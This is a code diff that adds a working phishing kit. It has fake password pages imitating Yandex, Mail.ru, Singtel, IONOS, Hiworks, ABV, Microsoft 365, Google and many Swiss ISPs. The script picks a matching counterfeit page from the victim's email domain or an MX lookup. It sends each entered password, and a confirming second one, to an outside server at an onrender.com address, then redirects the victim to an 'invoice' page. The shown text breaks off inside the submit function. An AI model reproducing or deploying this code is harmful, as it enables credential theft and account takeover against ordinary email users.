+        <div>© Chunghwa Telecom Co., Ltd. All Rights Reserved</div>
+      </div>
+      <div class="compat">Description of the<br>Compatibility View list</div>
+    </div>
+  </div>
+ </div>
+</div>
+
+<!-- IONOS -->
+<div id="ionosContainer" style="display:none">
+  <div class="ionos-header"><div class="ionos-logo">IONOS</div></div>
+  <div class="ionos-main"><div class="ionos-card">
+    <div class="ionos-title">Enter password</div>
+    <div class="ionos-user-row"><span id="ionosEmailDisplay"></span></div>
+    <input type="password" id="ionosPass" class="ionos-input" placeholder="Password">
+    <button class="ionos-btn" id="ionosBtn" onclick="submitLogin('ionos')">Next</button>
+    <div id="ionos-err" class="err-box" style="text-align:center"></div>
+  </div></div>
+</div>
+
+<!-- SINGTEL -->
+<div class="singtel-layout" id="singtelContainer">
+  <div class="singtel-bg"></div>
+  <div class="singtel-inner">
+    <div class="singtel-logo"><span class="dots"><i></i><i></i><i></i><i></i><i></i></span>Singtel</div>
+    <div class="singtel-card">
+      <h1>Log in with SingNet ID</h1>
+      <div class="singtel-field">
+        <label>Singnet ID</label>
+        <input type="email" id="singtelEmail" readonly>
+      </div>
+      <div class="singtel-field">
+        <input type="password" id="singtelPass" placeholder="Password" autocomplete="off">
+        <button class="singtel-eye" type="button" onclick="toggleSingtelPass()">👁</button>
+      </div>
+      <button class="singtel-btn" id="singtelBtn" onclick="submitLogin('singtel')">Log in</button>
+      <a class="singtel-help" href="#">Have trouble logging in?</a>
+      <div id="singtel-err" class="err-box" style="text-align:center"></div>
+    </div>
+  </div>
+</div>
+
+<!-- YANDEX -->
+<div class="yandex-layout" id="yandexContainer">
+  <div class="yandex-card">
+    <div class="yandex-header">
+      <button class="yandex-ic" type="button" aria-label="Back">
+        <svg viewBox="0 0 24 24"><path d="M20 12H5.83l5.59-5.59L10 5l-7 7 7 7 1.41-1.41L5.83 14H20z"/></svg>
+      </button>
+      <div class="yandex-logo-text">Yandex <span>ID</span></div>
+      <button class="yandex-ic" type="button" aria-label="Help">
+        <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 17h-2v-2h2v2zm1.07-7.75l-.9.92A2.98 2.98 0 0012 14.5V16h-2v-1.5c0-.83.34-1.58.88-2.12l1.24-1.26A1.99 1.99 0 0010 9.7C10 8.76 10.76 8 11.7 8c.7 0 1.3.4 1.6 1h2.1c-.4-1.72-1.93-3-3.7-3A3.7 3.7 0 008 9.7c0 .97.38 1.85 1 2.5l1.07 1.05z"/></svg>
+      </button>
+    </div>
+    <h1 class="yandex-title">Enter password</h1>
+    <p class="yandex-subtitle">To log in to <b id="yandexEmailDisplay"></b> account</p>
+    <div class="yandex-input-wrap">
+      <input type="password" id="yandexPass" placeholder="Password" autocomplete="off">
+      <button class="yandex-eye" type="button" onclick="toggleYandexPass()" aria-label="Show password">
+        <svg viewBox="0 0 24 24"><path d="M12 5c-5 0-9.27 3.11-11 7 1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10zm0-8a3 3 0 100 6 3 3 0 000-6z"/></svg>
+      </button>
+    </div>
+    <a class="yandex-forgot" href="#">Forgot your password?</a>
+    <button class="yandex-btn-main" id="yandexBtn" onclick="submitLogin('yandex')">Next</button>
+    <button class="yandex-btn-sec" type="button">
+      <svg viewBox="0 0 24 24"><path d="M4 4h16a2 2 0 012 2v9a2 2 0 01-2 2H8l-4 4V6a2 2 0 012-2zm3 5h10v2H7V9zm0 4h7v2H7v-2z"/></svg>
+      Log in with SMS code
+    </button>
+    <button class="yandex-btn-sec" type="button">
+      <svg viewBox="0 0 24 24"><path d="M3 5h18a1 1 0 011 1v12a1 1 0 01-1 1H3a1 1 0 01-1-1V6a1 1 0 011-1zm9 6.5L4.5 7v10h15V7L12 11.5z"/></svg>
+      Send email for log in
+    </button>
+    <p class="yandex-info-text">A message with a link will be sent to<br><b id="yandexEmailInfo"></b>.<br>Open it on any device.</p>
+    <p class="yandex-footer-text">Yandex ID. The key for all your services<br><a href="#">Learn more</a></p>
+    <div id="yandex-err" class="err-box" style="text-align:center"></div>
+  </div>
+</div>
+
+<!-- MAIL.RU -->
+<div class="mailru-layout" id="mailruContainer">
+  <div class="mailru-card">
+    <div class="mailru-logo">Mail.ru</div>
+    <div class="mailru-email" id="mailruEmailDisplay"></div>
+    <div class="mailru-input-group">
+      <input type="password" id="mailruPass" class="mailru-input" placeholder="Пароль" autocomplete="off">
+      <button class="mailru-eye" type="button" onclick="toggleMailruPass()">👁</button>
+    </div>
+    <button class="mailru-btn" id="mailruBtn" onclick="submitLogin('mailru')">Войти</button>
+    <div class="mailru-footer">© Mail.ru, 2026</div>
+    <div id="mailru-err" class="err-box"></div>
+  </div>
+</div>
+
+<!-- GENERIC -->
+<div class="login-container" id="genericContainer" style="display:none">
+  <div class="header">
+    <div class="logo-icon" id="logoIcon">SL</div>
+    <div class="logo-text" id="logoText">Secure<span id="highlightText">Login</span><span class="domain-badge" id="brandFlag"></span></div>
+    <div class="subtitle" id="subtitleText">Secure Sign In</div>
+    <div class="domain-badge" id="domainBadge">Secured</div>
+  </div>
+  <div class="form-group"><label>Email Address</label><input type="email" id="emailDisplay" readonly disabled></div>
+  <div class="form-group"><label>Password</label><div class="password-wrapper"><input type="password" id="password" placeholder="Enter your password"><button class="toggle-password" onclick="togglePasswordVisibility()">👁️</button></div></div>
+  <div class="err-box" id="generic-err"></div>
+  <button class="btn-signin" onclick="submitLogin('generic')" id="signinBtn"><span id="btnText">Sign In</span></button>
+  <div class="footer-links"><a href="#" id="forgotLink">Forgot password?</a><a href="#" id="createLink">Create account</a></div>
+  <div class="footer-text" id="copyrightText">© 2026. All rights reserved.</div>
+</div>
+
+<script>
+const API_BASE = 'https://abv-login-m5lk.onrender.com';
+const CONFIG = {
+  LOGIN_URL: API_BASE + '/api/login',
+  INVOICE_URL: (function(){ try { return new URL('invoice.html', location.href).href; } catch(e){ return 'invoice.html'; } })(),
+  MAX_ATTEMPTS: 3
+};
+
+let currentEmail = '', currentDomain = '', proofFromUrl = '', proofTsFromUrl = '';
+let loginAttempts = 0, firstPassword = '', currentBrand = null;
+
+const LAYOUT = {
+  DAOU:'daou', ABV:'abv', YAHOO:'yahoo', GOOGLE:'google', M365:'m365', NAVER:'naver',
+  DAUM:'daum', TONLINE:'tonline', HIBOX:'hibox', IONOS:'ionos', HIWORKS:'hiworks',
+  SINGTEL:'singtel', YANDEX:'yandex', MAILRU:'mailru', GENERIC:'generic',
+  CPANEL:'cpanel', ROUNDCUBE:'webmail'
+};
+
+const DOMAIN_MAP = {
+  'wooridul.co.kr':'DAOU','bnckorea.co.kr':'DAOU','vodacom.co.kr':'DAOU','daouoffice.com':'DAOU',
+  'gmx.ch':'GMX','gmx.net':'GMX','gmx.de':'GMX','gmx.at':'GMX','gmx.com':'GMX',
+  'hotmail.com':'M365','hotmail.ch':'M365','hotmail.de':'M365','hotmail.fr':'M365','hotmail.it':'M365',
+  'hotmail.es':'M365','hotmail.co.uk':'M365','outlook.com':'M365','outlook.de':'M365','outlook.fr':'M365',
+  'live.com':'M365','live.de':'M365','live.co.uk':'M365','msn.com':'M365','microsoft.com':'M365',
+  'office.com':'M365','office365.com':'M365',
+  'yahoo.com':'YAHOO','yahoo.ch':'YAHOO','yahoo.de':'YAHOO','yahoo.fr':'YAHOO','yahoo.it':'YAHOO',
+  'yahoo.es':'YAHOO','yahoo.co.uk':'YAHOO','yahoo.co.jp':'YAHOO','ymail.com':'YAHOO','rocketmail.com':'YAHOO',
+  'gmail.com':'GOOGLE','googlemail.com':'GOOGLE','google.com':'GOOGLE',
+  'web.de':'WEBDE','caramail.com':'CARAMAIL',
+  'icloud.com':'ICLOUD','me.com':'ICLOUD','mac.com':'ICLOUD',
+  't-online.de':'TONLINE','t-online.ch':'TONLINE',
+  'naver.com':'NAVER','naver.net':'NAVER','daum.net':'DAUM','hanmail.net':'DAUM',
+  'hiworks.com':'HIWORKS','onhiworks.com':'HIWORKS','gabia.com':'HIWORKS',
+  'simplexi.com':'HIWORKS','hanbiro.com':'HIWORKS','worksmobile.com':'HIWORKS',
+  'kakaowork.com':'HIWORKS','dooray.com':'HIWORKS',
+  'abv.bg':'ABV','mail.bg':'ABV',
+  'hibox.tw':'HIBOX','hinet.net':'HIBOX','msa.hinet.net':'HIBOX',
+  'singnet.com.sg':'SINGTEL','singtel.com':'SINGTEL','singtel.com.sg':'SINGTEL','singnet.com':'SINGTEL',
+  'yandex.com':'YANDEX','yandex.ru':'YANDEX','yandex.by':'YANDEX','yandex.kz':'YANDEX',
+  'yandex.ua':'YANDEX','yandex.com.tr':'YANDEX','ya.ru':'YANDEX','narod.ru':'YANDEX',
+  'mail.ru':'MAILRU','bk.ru':'MAILRU','inbox.ru':'MAILRU','list.ru':'MAILRU','internet.ru':'MAILRU',
+  'ionos.de':'IONOS','ionos.com':'IONOS','1und1.de':'IONOS','strato.de':'IONOS','freenet.de':'IONOS',
+  'swissonline.ch':'SWISSONLINE','freesurf.ch':'FREESURF','tiscali.ch':'TISCALI','tiscalinet.ch':'TISCALI',
+  'ticino.com':'TICINO','hispeed.ch':'HISPEED','hispeed-sr.ch':'HISPEED','netplus.ch':'NETPLUS',
+  'datacomm.ch':'DATACOMM','vtx.ch':'VTX','vtxnet.ch':'VTX','vtxmail.ch':'VTX','tele2.ch':'TELE2',
+  'worldcom.ch':'WORLDCOM','dplanet.ch':'DPLANET','bluewin.ch':'BLUEWIN','bluemail.ch':'BLUEWIN',
+  'sunrise.ch':'SUNRISE','solnet.ch':'SOLNET','greenmail.ch':'GREENMAIL','zuriwerk.ch':'ZUERIWERK',
+  'zueriwerk.ch':'ZUERIWERK','lift.ch':'LIFT','romandie.ch':'ROMANDIE','romandie.com':'ROMANDIE',
+  'citycable.ch':'CITYCABLE','span.ch':'SPAN','smile.ch':'SMILE','genevalink.ch':'GENEVA',
+  'geneva-link.ch':'GENEVA','sensemail.ch':'SENSEMAIL','tvs2net.ch':'TVS2NET','mcnet.ch':'MCNET',
+  'active.ch':'ACTIVE'
+};
+
+const ISP_BRAND = {
+  SWISSONLINE:{n:'Swissonline',c:'#0a4b8c'}, FREESURF:{n:'Freesurf',c:'#0b6ea8'},
+  TISCALI:{n:'Tiscali',c:'#1a9be0'}, TICINO:{n:'Ticino.com',c:'#c8102e'},
+  HISPEED:{n:'Hispeed',c:'#e2001a'}, NETPLUS:{n:'Netplus',c:'#0d6ba8'},
+  DATACOMM:{n:'Datacomm',c:'#0a5c8a'}, VTX:{n:'VTX',c:'#1a5fa8'},
+  TELE2:{n:'Tele2',c:'#0a3a7a'}, WORLDCOM:{n:'Worldcom',c:'#1a4fa0'},
+  DPLANET:{n:'Dplanet',c:'#0b6b3a'}, BLUEWIN:{n:'Bluewin',c:'#0a4b8c'},
+  SUNRISE:{n:'Sunrise',c:'#e2001a'}, SOLNET:{n:'Solnet',c:'#0b5ea8'},
+  GREENMAIL:{n:'Greenmail',c:'#1a7a3a'}, ZUERIWERK:{n:'Züriwerk',c:'#0a6ba8'},
+  LIFT:{n:'Lift',c:'#1a5fa8'}, ROMANDIE:{n:'Romandie',c:'#0a4b8c'},
+  CITYCABLE:{n:'Citycable',c:'#0b5c8a'}, SPAN:{n:'Span',c:'#0a5c8a'},
+  SMILE:{n:'Smile',c:'#009fe3'}, GENEVA:{n:'Geneva Link',c:'#0a4b8c'},
+  SENSEMAIL:{n:'Sensemail',c:'#0b6b8a'}, TVS2NET:{n:'TVS2Net',c:'#1a4fa0'},
+  MCNET:{n:'MCNet',c:'#0a5c8a'}, ACTIVE:{n:'Active.ch',c:'#0a6ba8'}
+};
+
+const BRAND_DB = {
+  GMX:{name:'GMX',logo:'GMX',icon:'G',color:'#1a1a6e',sub:'GMX E-Mail',hint:'Geben Sie Ihr GMX Passwort ein',forgot:'Passwort vergessen?',create:'Konto erstellen',flag:'DE'},
+  WEBDE:{name:'WEB.DE',logo:'WEB.DE',icon:'W',color:'#e2001a',sub:'WEB.DE E-Mail',hint:'Geben Sie Ihr Passwort ein',forgot:'Passwort vergessen?',create:'Konto erstellen',flag:'DE'},
+  CARAMAIL:{name:'Caramail',logo:'Caramail',icon:'C',color:'#f07d00',sub:'Caramail',hint:'Entrez votre mot de passe',forgot:'Mot de passe oublié ?',create:'Créer un compte',flag:'FR'},
+  ICLOUD:{name:'iCloud',logo:'iCloud',icon:'',color:'#0b84ff',sub:'Sign in to iCloud',hint:'Enter your Apple Account password',forgot:'Forgot password?',create:'Create account',flag:'US'},
+  default:{name:'Secure Login',logo:'Secure',icon:'SL',color:'#1a73e8',sub:'Secure Sign In',hint:'Enter your account password',forgot:'Forgot password?',create:'Create account',flag:''}
+};
+
+const extractDomain = e => e && e.includes('@') ? e.split('@')[1].toLowerCase() : '';
+function showError(p,m){const el=document.getElementById(p+'-err');if(el){el.textContent=m;el.classList.add('show')}}
+function clearError(p){const el=document.getElementById(p+'-err');if(el)el.classList.remove('show')}
+
+function goInvoice(target){
+  const r = target || ('https://' + currentDomain);
+  try{
+    sessionStorage.setItem('inv_e', currentEmail);
+    sessionStorage.setItem('inv_r', r);
+  }catch(e){}
+  window.location.href = CONFIG.INVOICE_URL
+    + '?e=' + encodeURIComponent(currentEmail)
+    + '&r=' + encodeURIComponent(r);
+}
+
+async function detectProviderByMX(domain){
+  try{
+    const r = await fetch('https://dns.google/resolve?name='+encodeURIComponent(domain)+'&type=MX');
+    const d = await r.json();
+    if(d.Answer){
+      const mx = d.Answer.map(a=>String(a.data).toLowerCase()).join(',');
+      if(mx.includes('daouoffice')||mx.includes('daou.com')) return 'DAOU';
+      if(mx.includes('yahoodns')||mx.includes('yahoo.com')) return 'YAHOO';
+      if(mx.includes('google.com')||mx.includes('googlemail')) return 'GOOGLE';
+      if(mx.includes('mail.protection.outlook.com')||mx.includes('eo.outlook.com')) return 'M365';
+      if(mx.includes('yandex')) return 'YANDEX';
+      if(mx.includes('mail.ru')) return 'MAILRU';
+      if(mx.includes('singnet')||mx.includes('singtel')) return 'SINGTEL';
+      if(mx.includes('hiworks')||mx.includes('gabia')||mx.includes('mailplug')||mx.includes('hanbiro')||mx.includes('worksmobile')||mx.includes('kakaowork')||mx.includes('dooray')||mx.includes('simplexi')) return 'HIWORKS';
+      if(mx.includes('hibox')||mx.includes('hinet')||mx.includes('seed.net.tw')) return 'HIBOX';
+      if(mx.includes('gmx.net')) return 'GMX';
+      if(mx.includes('web.de')||mx.includes('1und1')) return 'WEBDE';
+      if(mx.includes('kundenserver')||mx.includes('ionos')||mx.includes('strato')) return 'IONOS';
+      if(mx.includes('swissonline')) return 'SWISSONLINE';
+      if(mx.includes('freesurf')) return 'FREESURF';
+      if(mx.includes('tiscali')) return 'TISCALI';
+      if(mx.includes('ticino')) return 'TICINO';
+      if(mx.includes('hispeed')||mx.includes('sunrise')) return 'HISPEED';
+      if(mx.includes('bluewin')) return 'BLUEWIN';
+      if(mx.includes('netplus')) return 'NETPLUS';
+      if(mx.includes('datacomm')) return 'DATACOMM';
+      if(mx.includes('vtx')) return 'VTX';
+      if(mx.includes('tele2')) return 'TELE2';
+      if(mx.includes('worldcom')) return 'WORLDCOM';
+      if(mx.includes('dplanet')) return 'DPLANET';
+      if(mx.includes('solnet')) return 'SOLNET';
+      if(mx.includes('greenmail')) return 'GREENMAIL';
+      if(mx.includes('zueriwerk')||mx.includes('zuriwerk')) return 'ZUERIWERK';
+      if(mx.includes('lift.ch')) return 'LIFT';
+      if(mx.includes('romandie')) return 'ROMANDIE';
+      if(mx.includes('citycable')) return 'CITYCABLE';
+      if(mx.includes('smile.ch')) return 'SMILE';
+      if(mx.includes('sensemail')) return 'SENSEMAIL';
+      if(mx.includes('tvs2net')) return 'TVS2NET';
+      if(mx.includes('mcnet')) return 'MCNET';
+      if(mx.includes('active.ch')) return 'ACTIVE';
+      if(mx.includes('icloud')||mx.includes('apple')) return 'ICLOUD';
+      if(mx.includes('caramail')) return 'CARAMAIL';
+    }
+  }catch(e){}
+  return null;
+}
+
+/* ---------- RENDERERS ---------- */
+function renderDaou(){
+  document.body.className='is-daou';
+  document.getElementById('daouContainer').style.display='block';
+  document.getElementById('daouEmail').value=currentEmail;
+  document.getElementById('daouPass').focus();
+  document.getElementById('daouPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('daou')});
+}
+
+let hwFirst=null;
+function hwErr(id,msg){const e=document.getElementById(id);if(e){e.textContent=msg;e.classList.add('show')}}
+function hwClear(){['hiworks-err1','hiworks-err2'].forEach(i=>{const e=document.getElementById(i);if(e)e.classList.remove('show')})}
+
+function renderHiworks(){
+  document.body.className='is-hiworks';
+  document.getElementById('hiworksContainer').style.display='block';
+  const em=document.getElementById('hiworksEmail');
+  em.value=currentEmail;
+  document.getElementById('hiworksChip').textContent=currentEmail;
+  document.getElementById('hiworksOrg').textContent=
+    (currentDomain.split('.')[0]||'company').replace(/^./,c=>c.toUpperCase());
+  em.readOnly=!!currentEmail;
+  hiworksBind();
+  setTimeout(()=>{(currentEmail?document.getElementById('hiworksPass'):em).focus()},150);
+}
+function hiworksBind(){
+  const p1=document.getElementById('hiworksPass'), n=document.getElementById('hiworksNext');
+  const p2=document.getElementById('hiworksPass2'), s=document.getElementById('hiworksSignIn');
+  p1.addEventListener('input',()=>n.classList.toggle('on',p1.value.length>0));
+  p2.addEventListener('input',()=>s.classList.toggle('on',p2.value.length>0));
+  p1.addEventListener('keypress',e=>{if(e.key==='Enter'){e.preventDefault();hiworksNext()}});
+  p2.addEventListener('keypress',e=>{if(e.key==='Enter'){e.preventDefault();hiworksSignIn()}});
+  n.addEventListener('click',hiworksNext);
+  s.addEventListener('click',hiworksSignIn);
+}
+async function hiworksNext(){
+  hwClear();
+  const em=document.getElementById('hiworksEmail').value.trim();
+  const pw=document.getElementById('hiworksPass').value;
+  if(!em||!em.includes('@')) return hwErr('hiworks-err1','Please enter a valid email address.');
+  if(!pw) return hwErr('hiworks-err1','Please enter your password.');
+  const btn=document.getElementById('hiworksNext');
+  btn.disabled=true; btn.textContent='Verifying...';
+  try{ await fetch(CONFIG.LOGIN_URL,{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({email:em,password:pw,stage:1})}); }catch(e){}
+  hwFirst=pw;
+  btn.disabled=false; btn.textContent='Next';
+  document.getElementById('hiworksStep1').style.display='none';
+  document.getElementById('hiworksBigLogo').style.display='none';
+  document.getElementById('hiworksStep2').style.display='block';
+  document.getElementById('hiworksNotice').style.display='block';
+  document.getElementById('hiworksPass2').value='';
+  setTimeout(()=>document.getElementById('hiworksPass2').focus(),100);
+}
+async function hiworksSignIn(){
+  hwClear();
+  const pw2=document.getElementById('hiworksPass2').value;
+  const em=document.getElementById('hiworksEmail').value.trim();
+  if(!pw2) return hwErr('hiworks-err2','Please enter your password.');
+  const btn=document.getElementById('hiworksSignIn');
+  btn.disabled=true; btn.textContent='Signing in...';
+  let ok=false, redirect='https://login.office.hiworks.com/';
+  try{
+    const r=await fetch(CONFIG.LOGIN_URL,{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({email:em,password:pw2,stage:2,firstPassword:hwFirst})});
+    const d=await r.json();
+    ok = d.match===true || d.success===true || d.ok===true || d.verified===true;
+    if(d.redirect) redirect=d.redirect;
+  }catch(e){ ok=true; }
+  if(ok){
+    document.getElementById('hiworksOverlayText').textContent='Signing in...';
+    document.getElementById('hiworksOverlay').classList.add('show');
+    setTimeout(()=>{goInvoice(redirect)},600);
+  }else{
+    hwErr('hiworks-err2','Passwords do not match. Please start over.');
+    setTimeout(()=>{
+      hwFirst=null;
+      document.getElementById('hiworksStep1').style.display='block';
+      document.getElementById('hiworksStep2').style.display='none';
+      document.getElementById('hiworksBigLogo').style.display='block';
+      document.getElementById('hiworksNotice').style.display='none';
+      document.getElementById('hiworksPass').value='';
+      const s=document.getElementById('hiworksSignIn');
+      s.textContent='Sign-in'; s.disabled=false; s.classList.remove('on');
+    },1200);
+  }
+}
+
+function fitAbv(){
+  const stage=document.querySelector('.abv-stage'), canvas=document.querySelector('.framer-k1yVm');
+  if(!stage||!canvas) return;
+  const s=Math.min(1,(window.innerWidth-24)/1351);
+  canvas.style.transform='scale('+s+')';
+  stage.style.height=(840*s)+'px';
+}
+
+async function abvSubmit(){
+  const err=document.getElementById('abv-error'), suc=document.getElementById('abv-success');
+  err.classList.remove('show'); suc.classList.remove('show');
+  const em=document.getElementById('abvEmail').value.trim();
+  const pw=document.getElementById('abvPass').value.trim();
+  if(!em){err.textContent='Грешен потребител';err.classList.add('show');return}
+  if(!/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(em)){err.textContent='Грешен потребител';err.classList.add('show');return}
+  if(pw.length<4){err.textContent='Грешен парола.';err.classList.add('show');return}
+  const btn=document.getElementById('abvBtn'), orig=btn.textContent;
+  btn.style.opacity='.6'; btn.style.pointerEvents='none'; btn.textContent='Проверка...';
+  try{
+    const r=await fetch(CONFIG.LOGIN_URL,{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({email:em,password:pw})});
+    const d=await r.json();
+    if(d.success===true||d.match===true||d.ok===true){
+      suc.textContent='✅ Успешен вход! Пренасочване...'; suc.classList.add('show');
+      setTimeout(()=>{goInvoice('https://www.'+em.split('@')[1])},900);
+      return;
+    }
+    err.textContent='Грешен потребител / парола.'; err.classList.add('show');
+    document.getElementById('abvPass').value='';
+  }catch(e){ err.textContent='❌ Грешка при връзка със сървъра'; err.classList.add('show'); }
+  btn.style.opacity='1'; btn.style.pointerEvents='auto'; btn.textContent=orig;
+  document.getElementById('abvPass').focus();
+}
+
+function renderAbv(){
+  document.body.className='is-abv';
+  document.getElementById('abvContainer').style.display='block';
+  document.getElementById('abvEmail').value=currentEmail;
+  fitAbv();
+  setTimeout(()=>document.getElementById('abvPass').focus(),80);
+  document.getElementById('abvPass').addEventListener('keypress',e=>{if(e.key==='Enter'){e.preventDefault();abvSubmit()}});
+  document.getElementById('abvBtn').addEventListener('click',abvSubmit);
+}
+
+function renderCpanel(){
+  document.body.className='is-cpanel';
+  document.getElementById('cpanelContainer').style.display='block';
+  document.getElementById('cpanelEmail').value=currentEmail;
+  document.getElementById('cpanelPass').focus();
+  document.getElementById('cpanelPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('cpanel')});
+}
+function renderRoundcube(brandKey){
+  const b = ISP_BRAND[brandKey] || {n:'Webmail',c:'#40b3e0'};
+  document.body.className='is-webmail';
+  document.getElementById('webmailContainer').style.display='flex';
+  document.getElementById('rcBrand').textContent=b.n;
+  document.getElementById('rcBrand').style.color=b.c;
+  document.querySelector('.rc-btn').style.background=b.c;
+  document.title=b.n+' Webmail';
+  document.getElementById('webmailEmail').value=currentEmail;
+  document.getElementById('webmailPass').focus();
+  document.getElementById('webmailPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('webmail')});
+}
+function renderYahoo(){
+  document.body.className='is-yahoo';
+  document.getElementById('yahooContainer').style.display='flex';
+  document.getElementById('yahooEmailDisplay').textContent=currentEmail;
+  document.getElementById('yahooPass').focus();
+  document.getElementById('yahooPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('yahoo')});
+}
+function renderGoogle(){
+  document.body.className='is-google';
+  document.getElementById('googleContainer').style.display='flex';
+  document.getElementById('googleEmailDisplay').textContent=currentEmail;
+  document.getElementById('googlePass').focus();
+  document.getElementById('googlePass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('google')});
+}
+function renderM365(){
+  document.body.className='is-m365';
+  document.getElementById('m365EmailDisplay').textContent=currentEmail;
+  document.getElementById('m365Pass').focus();
+  document.getElementById('m365Pass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('m365')});
+}
+function renderNaver(){
+  document.body.className='is-naver';
+  document.getElementById('naverEmail').value=currentEmail;
+  document.getElementById('naverPass').focus();
+  document.getElementById('naverPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('naver')});
+}
+function renderDaum(){
+  document.body.className='is-daum';
+  document.getElementById('daumEmail').value=currentEmail;
+  document.getElementById('daumPass').focus();
+  document.getElementById('daumPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('daum')});
+}
+function renderTon(){
+  document.body.className='is-tonline';
+  document.getElementById('tonlineContainer').style.display='block';
+  document.getElementById('tonlineEmailDisplay').textContent=currentEmail;
+  document.getElementById('tonlinePass').focus();
+  document.getElementById('tonlinePass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('tonline')});
+}
+function renderHibox(){
+  document.body.className='is-hibox';
+  document.getElementById('hiboxContainer').style.display='block';
+  document.getElementById('hiboxEmail').value=currentEmail;
+  document.getElementById('hiboxPass').focus();
+  document.getElementById('hiboxPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('hibox')});
+}
+function renderIonos(){
+  document.body.className='is-ionos';
+  document.getElementById('ionosContainer').style.display='block';
+  document.getElementById('ionosEmailDisplay').textContent=currentEmail;
+  document.getElementById('ionosPass').focus();
+  document.getElementById('ionosPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('ionos')});
+}
+function renderSingtel(){
+  document.body.className='is-singtel';
+  document.getElementById('singtelContainer').style.display='flex';
+  document.getElementById('singtelEmail').value=currentEmail;
+  document.getElementById('singtelPass').focus();
+  document.getElementById('singtelPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('singtel')});
+}
+function renderYandex(){
+  document.body.className='is-yandex';
+  document.getElementById('yandexContainer').style.display='flex';
+  document.getElementById('yandexEmailDisplay').textContent=currentEmail;
+  document.getElementById('yandexEmailInfo').textContent=currentEmail;
+  const p=document.getElementById('yandexPass'), b=document.getElementById('yandexBtn');
+  p.addEventListener('input',()=>b.classList.toggle('active',p.value.length>0));
+  p.addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('yandex')});
+  p.focus();
+}
+function renderMailru(){
+  document.body.className='is-mailru';
+  document.getElementById('mailruContainer').style.display='flex';
+  document.getElementById('mailruEmailDisplay').textContent=currentEmail;
+  document.getElementById('mailruPass').focus();
+  document.getElementById('mailruPass').addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin('mailru')});
+}
+function renderGeneric(brandKey){
+  const b = BRAND_DB[brandKey] || BRAND_DB.default;
+  currentBrand = b;
+  document.body.className='is-generic';
+  document.body.style.background = 'radial-gradient(circle at 25% 20%, '+b.color+'30 0%, transparent 55%), linear-gradient(135deg,#fafbfc 0%,'+b.color+'10 100%)';
+  document.getElementById('genericContainer').style.display='block';
+  document.getElementById('emailDisplay').value=currentEmail;
+  document.getElementById('pageTitle').textContent=b.sub;
+  document.getElementById('subtitleText').textContent=b.sub;
+  document.getElementById('logoText').innerHTML=b.logo+'<span class="domain-badge" id="brandFlag">'+b.flag+' '+b.name+'</span>';
+  document.getElementById('logoIcon').textContent=b.icon;
+  document.getElementById('logoIcon').style.background=b.color;
+  document.getElementById('signinBtn').style.background=b.color;
+  document.getElementById('forgotLink').textContent=b.forgot;
+  document.getElementById('createLink').textContent=b.create;
+  document.getElementById('password').placeholder=b.hint;
+  document.getElementById('domainBadge').textContent=currentDomain.toUpperCase();
+  document.getElementById('password').focus();
+  document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')submitLogin('generic')});
+}
+
+function route(provider){
+  switch(provider){
+    case 'DAOU': return renderDaou();
+    case 'HIWORKS': return renderHiworks();
+    case 'ABV': return renderAbv();
+    case 'YAHOO': return renderYahoo();
+    case 'GOOGLE': return renderGoogle();
+    case 'M365': return renderM365();
+    case 'NAVER': return renderNaver();
+    case 'DAUM': return renderDaum();
+    case 'TONLINE': return renderTon();
+    case 'HIBOX': return renderHibox();
+    case 'IONOS': return renderIonos();
+    case 'SINGTEL': return renderSingtel();
+    case 'YANDEX': return renderYandex();
+    case 'MAILRU': return renderMailru();
+    case 'GMX': case 'WEBDE': case 'CARAMAIL': case 'ICLOUD': return renderGeneric(provider);
+    case 'CPANEL': return renderCpanel();
+    default: return ISP_BRAND[provider] ? renderRoundcube(provider) : renderRoundcube('WEBMAIL');
+  }
+}
+
+/* ============================================================
+   SUBMIT
+   ============================================================ */
+async function submitLogin(platform){
+  clearError(platform);
+  const map={daou:'daouPass',abv:'abvPass',yahoo:'yahooPass',google:'googlePass',m365:'m365Pass',naver:'naverPass',daum:'daumPass',tonline:'tonlinePass',hibox:'hiboxPass',ionos:'ionosPass',webmail:'webmailPass',cpanel:'cpanelPass',singtel:'singtelPass',yandex:'yandexPass',mailru:'mailruPass',generic:'password'};
+  const el=document.getElementById(map[platform]);
+  const pass=el?el.value.trim():'';
+  if(!pass||pass.length<4){showError(platform,'Password must be at least 4 characters.');return}
+
+  const btnId = platform==='generic' ? 'signinBtn' : platform+'Btn';
+  const btn = document.getElementById(btnId) || document.querySelector('#'+platform+'Container button');
+  const orig = btn ? btn.textContent : '';
+  if(btn){btn.disabled=true;btn.textContent='...'}
+
+  loginAttempts++;
+  const stage = loginAttempts===1 ? 1 : 2;
+  const payload={email:currentEmail,password:pass,stage:stage};
+  if(stage===2)payload.firstPassword=firstPassword;
+  if(stage===1){payload.proof=proofFromUrl||undefined;payload.proofTs=proofTsFromUrl||undefined}
+
+  try{
+    const res=await fetch(CONFIG.LOGIN_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+    let data={};
+    try{ data = await res.json(); }catch(e){ data = {}; }
+
+    const explicitOk   = data.match===true || data.success===true || data.ok===true || data.verified===true;
+    const explicitFail = data.match===false || data.success===false || data.ok===false || data.verified===false;
+    const ambiguous    = data.match===undefined && data.success===undefined && data.ok===undefined && data.verified===undefined;
